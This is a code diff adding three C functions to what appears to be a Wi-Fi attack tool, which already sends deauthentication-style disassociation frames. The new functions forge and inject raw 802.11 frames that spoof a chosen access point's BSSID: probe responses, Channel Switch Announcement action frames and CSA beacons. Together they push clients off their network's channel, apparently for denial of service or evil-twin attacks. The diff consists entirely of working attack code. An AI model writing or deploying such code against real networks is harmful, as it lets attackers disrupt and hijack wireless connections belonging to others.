@@ -157,3 +157,128 @@ void wsl_bypasser_send_disassociation_frame(const uint8_t *ap_bssid, const uint8
 
     wsl_bypasser_send_raw_frame(disas_frame, sizeof(disas_frame));
 }
+
+bool wsl_bypasser_send_probe_response(const uint8_t *dest_mac,
+                                      const uint8_t *bssid,
+                                      const uint8_t *ssid,
+                                      uint8_t ssid_length,
+                                      uint8_t channel)
+{
+    if (dest_mac == NULL || bssid == NULL || ssid == NULL) {
+        return false;
+    }
+    if (ssid_length > 32) {
+        ssid_length = 32;
+    }
+
+    uint8_t frame[160];
+    memset(frame, 0, sizeof(frame));
+    frame[0] = 0x50; /* Probe Response */
+    frame[1] = 0x00;
+    memcpy(&frame[4], dest_mac, 6);
+    memcpy(&frame[10], bssid, 6);
+    memcpy(&frame[16], bssid, 6);
+
+    /* Fixed params: timestamp(8) + beacon interval(2) + capability(2) */
+    frame[32] = 0x64; /* interval */
+    frame[33] = 0x00;
+    frame[34] = 0x01; /* ESS */
+    frame[35] = 0x04;
+
+    size_t off = 36;
+    frame[off++] = 0x00;
+    frame[off++] = ssid_length;
+    memcpy(&frame[off], ssid, ssid_length);
+    off += ssid_length;
+
+    /* Supported rates */
+    frame[off++] = 0x01;
+    frame[off++] = 0x08;
+    frame[off++] = 0x82; frame[off++] = 0x84; frame[off++] = 0x8b; frame[off++] = 0x96;
+    frame[off++] = 0x0c; frame[off++] = 0x12; frame[off++] = 0x18; frame[off++] = 0x24;
+
+    /* DS parameter set */
+    frame[off++] = 0x03;
+    frame[off++] = 0x01;
+    frame[off++] = channel;
+
+    return wsl_bypasser_send_raw_frame(frame, (int)off);
+}
+
+bool wsl_bypasser_send_csa_action(const uint8_t *ap_bssid,
+                                  const uint8_t *dest_mac,
+                                  uint8_t new_channel,
+                                  uint8_t count,
+                                  uint8_t mode)
+{
+    if (ap_bssid == NULL || dest_mac == NULL) {
+        return false;
+    }
+    /* Action frame: Spectrum Management / Channel Switch Announcement */
+    uint8_t frame[32] = {
+        0xD0, 0x00,             /* Action */
+        0x3A, 0x01,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00,
+        0x00,                   /* Category: Spectrum Management */
+        0x04,                   /* Action: Channel Switch Announcement */
+        0x00,                   /* mode */
+        0x01,                   /* new channel */
+        0x01                    /* count */
+    };
+    memcpy(&frame[4], dest_mac, 6);
+    memcpy(&frame[10], ap_bssid, 6);
+    memcpy(&frame[16], ap_bssid, 6);
+    frame[26] = mode;
+    frame[27] = new_channel;
+    frame[28] = count;
+    return wsl_bypasser_send_raw_frame(frame, 29);
+}
+
+bool wsl_bypasser_send_csa_beacon(const uint8_t *bssid,
+                                  const uint8_t *ssid,
+                                  uint8_t ssid_length,
+                                  uint8_t current_channel,
+                                  uint8_t new_channel,
+                                  uint8_t count,
+                                  uint8_t mode)
+{
+    if (bssid == NULL || ssid == NULL) {
+        return false;
+    }
+    if (ssid_length > 32) {
+        ssid_length = 32;
+    }
+
+    uint8_t frame[160];
+    memset(frame, 0, sizeof(frame));
+    frame[0] = 0x80;
+    memset(&frame[4], 0xFF, 6);
+    memcpy(&frame[10], bssid, 6);
+    memcpy(&frame[16], bssid, 6);
+    frame[32] = 0x64;
+    frame[33] = 0x00;
+    frame[34] = 0x01;
+    frame[35] = 0x04;
+
+    size_t off = 36;
+    frame[off++] = 0x00;
+    frame[off++] = ssid_length;
+    memcpy(&frame[off], ssid, ssid_length);
+    off += ssid_length;
+
+    frame[off++] = 0x03;
+    frame[off++] = 0x01;
+    frame[off++] = current_channel;
+
+    /* CSA IE tag 37 (0x25) */
+    frame[off++] = 0x25;
+    frame[off++] = 0x03;
+    frame[off++] = mode;
+    frame[off++] = new_channel;
+    frame[off++] = count;
+
+    return wsl_bypasser_send_raw_frame(frame, (int)off);
+}
